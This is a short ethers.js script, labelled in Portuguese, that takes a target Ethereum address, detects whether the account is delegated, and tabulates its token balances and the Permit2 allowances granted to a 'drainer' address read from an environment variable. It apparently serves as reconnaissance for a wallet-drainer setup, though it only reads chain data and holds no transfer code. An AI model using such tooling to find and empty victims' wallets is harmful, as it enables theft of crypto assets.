import { getAddress } from "ethers";
import { loadEnv, portfolio, codeKind } from "./lib.mjs";

const owner = getAddress(process.argv[2] ?? "");
const { provider } = loadEnv();

const kind = await codeKind(provider, owner);
const rows = await portfolio(provider, owner, process.env.DRAINER);

console.log(`alvo: ${owner}`);
console.log(`tipo de conta: ${kind}`);
console.log("");
if (rows.length === 0) {
  console.log("nada nos tokens monitorados");
} else {
  console.table(
    rows.map((r) => ({
      token: r.symbol,
      saldo: r.human,
      permit2: r.permit2Amount === "0" ? "-" : r.permit2Amount,
      expira: r.permit2Expiration || "-",
      nonce: r.permit2Nonce,
    })),
  );
}

const approved = rows.filter((r) => r.permit2Amount !== "0");
console.log("");
console.log(`tokens com allowance no Permit2 para o drainer: ${approved.length}`);
if (kind.startsWith("delegated:")) console.log(`delegação atual: ${kind.slice(10)}`);
console.log("");
console.log(JSON.stringify({ owner, kind, rows }, null, 2));
